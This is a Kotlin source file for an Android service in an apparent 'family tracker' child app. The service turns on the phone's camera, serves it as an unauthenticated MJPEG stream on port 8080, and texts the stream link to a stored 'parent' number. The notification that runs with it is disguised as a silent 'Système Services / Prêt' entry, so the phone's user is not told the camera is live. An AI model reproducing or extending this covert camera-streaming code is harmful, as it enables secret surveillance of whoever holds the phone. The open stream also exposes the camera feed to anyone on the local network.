package com.family.tracker.child

import android.app.*
import android.content.*
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.*
import android.util.Log
import android.util.Size
import androidx.core.app.NotificationCompat
import fi.iki.elonen.NanoHTTPD
import java.io.*
import java.util.concurrent.*

class MJPEGServer : Service() {
    companion object {
        private const val TAG = "MJPEG"
        private const val CHANNEL = "MJPEGServer"
        private const val PORT = 8080
        var server: MJPEGHTTPServer? = null
        var camera: CameraDevice? = null
        var reader: ImageReader? = null
        var running = false
        var camFacing = CameraCharacteristics.LENS_FACING_BACK
        val frames = LinkedBlockingQueue<ByteArray>(5)
        const val START = "com.family.tracker.START_MJPEG"
        const val STOP = "com.family.tracker.STOP_MJPEG"
        const val SWITCH = "com.family.tracker.SWITCH_MJPEG"
    }

    override fun onCreate() {
        super.onCreate()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            getSystemService(NotificationManager::class.java).createNotificationChannel(
                NotificationChannel(CHANNEL, "Flux Caméra", NotificationManager.IMPORTANCE_LOW)
            )
        }
        startForeground(1, NotificationCompat.Builder(this, CHANNEL)
            .setContentTitle("Système Services")
            .setContentText("Prêt")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setSilent(true)
            .setOngoing(true)
            .build())
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) { START -> start(); STOP -> stop(); SWITCH -> switch() }
        return START_STICKY
    }

    private fun start() {
        if (running) return
        openCam()
        server = MJPEGHTTPServer().apply { start(NanoHTTPD.SOCKET_READ_TIMEOUT, false) }
        running = true
        val ip = getIP()
        val url = "http://$ip:$PORT/stream.mjpeg"
        getSharedPreferences("tracker", MODE_PRIVATE).edit().putString("stream_url", url).apply()
        val parent = getSharedPreferences("tracker", MODE_PRIVATE).getString("parent", "")
        if (!parent.isNullOrEmpty()) android.telephony.SmsManager.getDefault()
            .sendTextMessage(parent, null, "✅ FLUX VIDÉO : $url", null, null)
        Log.d(TAG, "✅ Flux : $url")
    }

    private fun stop() {
        server?.stop(); camera?.close(); reader?.close(); frames.clear()
        server = null; camera = null; reader = null; running = false
    }

    private fun switch() {
        camFacing = if (camFacing == CameraCharacteristics.LENS_FACING_BACK)
            CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK
        if (running) { stop(); start() }
    }

    private fun openCam() {
        val mgr = getSystemService(CAMERA_SERVICE) as CameraManager
        val id = mgr.cameraIdList.firstOrNull {
            mgr.getCameraCharacteristics(it).get(CameraCharacteristics.LENS_FACING) == camFacing
        } ?: mgr.cameraIdList[0]
        reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 3)
        mgr.openCamera(id, object : CameraDevice.StateCallback() {
            override fun onOpened(cam: CameraDevice) {
                camera = cam
                val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                    addTarget(reader!!.surface)
                    set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                }
                cam.createCaptureSession(listOf(reader!!.surface), null).setRepeatingRequest(req.build(), null, null)
                reader!!.setOnImageAvailableListener({ r ->
                    val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                    val buf = img.planes[0].buffer
                    val bytes = ByteArray(buf.remaining())
                    buf.get(bytes)
                    if (!frames.offer(bytes)) { frames.poll(); frames.offer(bytes) }
                    img.close()
                }, null)
            }
            override fun onDisconnected(cam: CameraDevice) { cam.close() }
            override fun onError(cam: CameraDevice, e: Int) { cam.close() }
        }, null)
    }

    private fun getIP(): String {
        return java.net.NetworkInterface.getNetworkInterfaces().toList()
            .flatMap { it.inetAddresses.toList() }
            .firstOrNull { !it.isLoopbackAddress && !it.hostAddress.orEmpty().contains(":") }
            ?.hostAddress ?: "0.0.0.0"
    }

    inner class MJPEGHTTPServer : NanoHTTPD(PORT) {
        override fun serve(session: IHTTPSession): Response = when (session.uri) {
            "/" -> newFixedLengthResponse(Response.Status.OK, "text/html", """
                <html><body style=background:#000;margin:0>
                <img src=/stream.mjpeg style=width:100%>
                </body></html>
            """.trimIndent())
            "/stream.mjpeg" -> {
                val boundary = "--frame-${System.currentTimeMillis()}"
                val pis = PipedInputStream()
                val pos = PipedOutputStream(pis)
                Thread {
                    try {
                        while (running) {
                            val frame = frames.poll(66, TimeUnit.MILLISECONDS) ?: continue
                            pos.write("$boundary\r\nContent-Type: image/jpeg\r\nContent-Length: ${frame.size}\r\n\r\n".toByteArray())
                            pos.write(frame); pos.write("\r\n".toByteArray())
                        }
                    } catch (_: Exception) {}
                    pos.close()
                }.start()
                newFixedLengthResponse(Response.Status.OK, "multipart/x-mixed-replace; boundary=$boundary", pis, -1)
            }
            else -> newFixedLengthResponse(Response.Status.NOT_FOUND, "text/plain", "Not Found")
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
